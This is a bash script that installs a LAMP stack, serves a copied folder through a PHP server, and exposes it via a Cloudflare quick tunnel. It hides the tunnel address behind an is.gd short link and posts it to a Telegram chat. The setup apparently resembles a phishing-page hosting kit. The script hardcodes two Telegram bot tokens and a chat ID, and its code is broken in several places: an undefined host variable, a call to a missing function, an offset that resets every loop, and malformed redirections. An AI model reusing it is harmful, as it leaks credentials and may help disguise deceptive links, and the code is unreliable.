#!/bin/bash

# Function to get the status of the program
get_status() {
    if pgrep -f "5.sh" >/dev/null; then
        echo "Program is running."
    else
        echo "Program is not running."
    fi
}

# Function to start the program
start_program() {
    if pgrep -f "5.sh" >/dev/null; then
        echo "Program is already running."
    else
        echo "Starting the program..."
        # Add your command to start the program here
        echo "Program started."
    fi
}

# Function to stop the program
stop_program() {
    if pgrep -f "5.sh" >/dev/null; then
        echo "Stopping the program..."
        # Add your command to stop the program here
        echo "Program stopped."
    else
        echo "Program is not running."
    fi
}

# Function to restart the program
restart_program() {
    stop_program
    start_program
}

# Function to retrieve and send program logs
send_logs() {
    # Add your command to retrieve program logs here
    logs=$(cat logs/logs.log)
    # Send logs using your preferred method (e.g., curl to a Telegram bot API)
    echo "$logs"
}

# Main script logic
case "$1" in
    status)
        get_status
        ;;
    start)
        start_program
        ;;
    stop)
        stop_program
        ;;
    restart)
        restart_program
        ;;
    logs)
        send_logs
        ;;
    *)
        echo "Unknown command: $1"
        ;;
esac

# Create directories if they don't exist
mkdir -p online
mkdir -p cloudflared

# Copy offline files to online directory
cp -r offline/* online/

# Grant execute permissions to cloudflared binary
chmod +x host/cloudflared

# Install Apache2
apt-get update
apt-get install apache2 -y

# Install PHP
apt-get install php -y

# Install MariaDB (drop-in replacement for MySQL)
apt-get install mariadb-server -y

# Start MariaDB service
service mariadb start

# Start PHP server in the background on a random port within the range of 8800 to 8880
port=$((RANDOM % 81 + 8800))
cd online && php -S localhost:$port > /dev/null 2>&1 &

# Start Cloudflare tunnel
start_cloudflared() {
    if [[ ! -f host/cloudflared ]]; then
        echo "Cloudflared binary not found. Please make sure it is present."
        exit 1
    fi

    echo "Starting Cloudflare tunnel..."
    if [[ $(command -v termux-chroot) ]]; then
        sleep 2 && termux-chroot host/cloudflared tunnel -url "$host":"$port" > logs/.cloudfl.log 2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && host/cloudflared tunnel -url "$host":"$port" > logs/.cloudfl.log 2>&1 & > /dev/null 2>&1 &
    fi

    sleep 12

    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "logs/.cloudfl.log")
    url_0="${cldflr_url}/index.php"

    url0=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_0")

    # Send links to Telegram bot
    telegram_bot_token="6108701453:AAEiADxnp9i6WsQK3-ZfEJBS1dNi3oLcZoA"
    telegram_chat_id="-973532159"

    message="$url0"
    curl -s -X POST "https://api.telegram.org/bot$telegram_bot_token/sendMessage" -d "chat_id=$telegram_chat_id" -d "text=$message"

    ${ORANGEBG}
}

start_cloudflared

# Restart server command handler
restart_server() {
    service apache2 restart
    sleep 2
    service mysql restart
    sleep 2
    killall php
    sleep 2
    start_cloudflared
    echo "Server restarted successfully."
}

# Telegram bot command handler
handle_bot_command() {
    command=$1
    case $command in
        "/restart")
            restart
            ;;
        *)
            echo "Unknown command: $command"
            ;;
    esac
}

# Main loop to listen for Telegram bot commands
while true; do
    telegram_bot_token="6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"
    telegram_update_id=0

    # Get updates from Telegram bot
    updates=$(curl -s "https://api.telegram.org/bot$telegram_bot_token/getUpdates?offset=$((telegram_update_id + 1))")

    # Parse each update
    for update in $(echo "$updates" | jq -r '.result[] | @base64'); do
        # Extract relevant information from update
        update=$(echo "$update" | base64 -d)
        message_id=$(echo "$update" | jq -r '.message.message_id')
        chat_id=$(echo "$update" | jq -r '.message.chat.id')
        text=$(echo "$update" | jq -r '.message.text')

        # Handle bot command
        handle_bot_command "$text"

        # Update the last processed update ID
        telegram_update_id=$(echo "$update" | jq -r '.update_id')
    done

    # Sleep for 1 second before checking for new updates
    sleep 1
done
